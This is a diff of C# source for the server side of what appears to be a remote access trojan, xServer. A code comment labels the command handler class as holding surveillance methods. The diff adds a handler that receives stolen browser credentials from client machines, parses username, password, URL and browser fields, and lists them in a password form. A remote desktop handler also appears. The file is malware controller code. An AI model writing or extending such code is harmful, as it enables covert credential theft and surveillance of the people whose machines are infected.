@@ -1,16 +1,42 @@
-﻿using System.IO;
+using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Threading;
 using System.Windows.Forms;
 using xServer.Core.Networking;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Core.Packets.ServerPackets;
 using xServer.Core.Utilities;
+using xServer.Core.Recovery.Helper;
 
 namespace xServer.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT ARE USED FOR SURVEILLANCE. */
     public static partial class CommandHandler
     {
+        public static void HandlePasswordResponse(Client client, GetPasswordsResponse packet)
+        {
+            if (client.Value.FrmPass == null)
+                return;
+
+            if (packet.Passwords == null)
+                return;
+
+            List<LoginInfo> lst = new List<LoginInfo>();
+
+            foreach (string str in packet.Passwords)
+            {
+                // raw passworddata
+                string[] values = str.Split(new string[] { "|$|" }, StringSplitOptions.None);
+                lst.Add(new LoginInfo() { Username = values[0], Password = values[1], URL = values[2], Browser = values[3] });
+            }
+
+            foreach (LoginInfo login in lst)
+            {
+                // add them to the listview of frmpass
+                client.Value.FrmPass.AddPassword(login, client);
+            }
+        }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
             if (client.Value == null || client.Value.FrmRdp == null)
